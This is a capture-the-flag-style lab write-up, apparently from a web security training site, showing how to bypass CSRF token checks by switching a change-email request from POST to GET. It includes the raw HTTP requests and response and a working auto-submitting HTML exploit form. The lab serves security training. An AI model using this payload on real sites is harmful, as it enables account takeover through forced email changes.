#  Lab: CSRF where token validation depends on request method

- A `change email` functionality can be seen after logging to a user account.

![](Vulnerabilities/CSRF/img/lab-2-1.png)

- However, there is a CSRF defense mechanism in place that uses a `CSRF` token.

```
POST /my-account/change-email HTTP/1.1
Host: ac4e1f1c1f7bba60c0d4325c00260009.web-security-academy.net
Cookie: session=ZIPfYwF7MJsmfDdPULKKtruSMGuYLmsn
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 59
Origin: https://ac4e1f1c1f7bba60c0d4325c00260009.web-security-academy.net
Referer: https://ac4e1f1c1f7bba60c0d4325c00260009.web-security-academy.net/my-account
Upgrade-Insecure-Requests: 1
Sec-Gpc: 1
Te: trailers
Connection: close

email=test%40test.com&csrf=rDCXCxyRFuxi8YZmMHPGFdgccydvEM0H
```

- Using a different request method successfully bypasses the defense mechanism for `CSRF`.

```
GET /my-account/change-email?email=root%40nehal.hacks&csrf=rDCXCxyRFuxi8YZmMHPGFdgccydvEM0H HTTP/1.1
Host: ac4e1f1c1f7bba60c0d4325c00260009.web-security-academy.net
Cookie: session=ZIPfYwF7MJsmfDdPULKKtruSMGuYLmsn
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Origin: https://ac4e1f1c1f7bba60c0d4325c00260009.web-security-academy.net
Referer: https://ac4e1f1c1f7bba60c0d4325c00260009.web-security-academy.net/my-account
Upgrade-Insecure-Requests: 1
Sec-Gpc: 1
Te: trailers
Connection: close
```

```
HTTP/1.1 302 Found
Location: /my-account
Connection: close
Content-Length: 0
```

- Exploit `html` - 

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://ac4e1f1c1f7bba60c0d4325c00260009.web-security-academy.net/my-account/change-email">
      <input type="hidden" name="email" value="root&#64;nehal&#46;hacks" />
      <input type="hidden" name="csrf" value="rDCXCxyRFuxi8YZmMHPGFdgccydvEM0H" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

